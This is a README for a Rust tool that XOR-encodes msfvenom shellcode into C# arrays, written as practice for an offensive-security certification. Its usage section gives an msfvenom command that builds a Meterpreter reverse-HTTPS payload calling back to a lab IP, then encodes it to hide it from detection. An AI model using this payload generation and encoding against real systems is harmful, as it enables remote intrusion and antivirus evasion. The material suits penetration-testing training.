# encoder-decoder

This is my tool for XOR encoding msfvenom payloads for practice in the OSEP. The tool randomly generates (and outputs) a key of equal size to the inputted payload as well as the XOR encoded payload in a csharp format.

Eventually I'll add decoding functionality and the ability to input premade keys as well as more output types than csharp

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)

## Installation

**From Source**:

```bash
git clone https://github.com/Raznoo/encoder-decoder.git
cd encoder-decoder

# Build the project
cargo build --release

# The executable will be located in target/release/
```

### Encoding

```
msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.45.155 -f raw -o raw_payload.bin

encoder-decoder encode -i raw_payload.bin -o encrypted_payload.cs

cat encrypted_payload.cs && cat key.cs
```

### Decoding
TODO
